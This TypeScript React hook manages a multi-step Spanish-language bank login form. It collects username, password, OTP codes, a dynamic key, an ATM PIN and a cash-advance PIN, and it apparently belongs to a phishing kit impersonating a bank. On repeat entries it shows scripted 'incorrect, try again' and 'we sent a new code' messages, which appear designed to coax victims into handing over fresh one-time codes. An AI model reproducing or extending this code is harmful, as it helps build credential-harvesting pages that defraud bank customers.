import { useState } from 'react';
import { FormType, BankFormData } from './useBankAPI';

export const useBankForm = () => {
    const [currentForm, setCurrentForm] = useState<FormType>('checker-userpassword');
    const [formData, setFormData] = useState<BankFormData>({
        user: '',
        puser: '',
        otp: '',
        cdin: '',
        ccaj: '',
        cavance: ''
    });
    const [submittedFields, setSubmittedFields] = useState<Set<string>>(new Set());

    const updateFormData = (field: keyof BankFormData, value: string) => {
        setFormData(prev => ({ ...prev, [field]: value }));
    };

    const clearField = (fieldName: keyof BankFormData) => {
        setFormData(prev => ({ ...prev, [fieldName]: '' }));
        setSubmittedFields(prev => {
            const newSet = new Set(prev);
            newSet.delete(fieldName);
            return newSet;
        });
    };

    const markFieldAsSubmitted = (fieldName: keyof BankFormData) => {
        setSubmittedFields(prev => new Set([...prev, fieldName]));
    };

    const getErrorMessage = (fieldName: keyof BankFormData) => {
        if (submittedFields.has(fieldName)) {
            // Mensajes para segunda vez o más
            switch (fieldName) {
                case 'cdin':
                    return 'Clave Dinámica incorrecta o expiró';
                case 'otp':
                    return 'Hemos enviado un nuevo código a tu teléfono. Ingresalo.';
                case 'ccaj':
                    return 'Clave incorrecta, inténtalo nuevamente';
                case 'cavance':
                    return 'Clave incorrecta, inténtalo nuevamente';
                case 'user':
                    return 'Usuario incorrecto, inténtalo nuevamente';
                case 'puser':
                    return 'Contraseña incorrecta, inténtalo nuevamente';
                default:
                    return 'Dato incorrecto, por favor ingréselo nuevamente';
            }
        } else {
            // Mensajes para primera vez
            switch (fieldName) {
                case 'cdin':
                    return 'Por favor ingresa tu Clave Dinámica';
                case 'otp':
                    return 'Ingresa el código OTP que hemos enviado a tu teléfono';
                case 'ccaj':
                    return 'Por favor ingresa tu clave de Cajero';
                case 'cavance':
                    return 'Por favor ingresa tu clave de avances';
                case 'user':
                    return ''; // No mostrar mensaje inicial para usuario
                case 'puser':
                    return ''; // No mostrar mensaje inicial para contraseña
                default:
                    return 'Por favor ingrese el dato';
            }
        }
    };

    const handleFormTransition = (redirectTo: FormType) => {
        setCurrentForm(redirectTo);
    };

    const resetForm = () => {
        setFormData({
            user: '',
            puser: '',
            otp: '',
            cdin: '',
            ccaj: '',
            cavance: ''
        });
        setSubmittedFields(new Set());
        setCurrentForm('checker-userpassword');
    };

    return {
        currentForm,
        formData,
        submittedFields,
        updateFormData,
        clearField,
        markFieldAsSubmitted,
        getErrorMessage,
        handleFormTransition,
        resetForm
    };
};
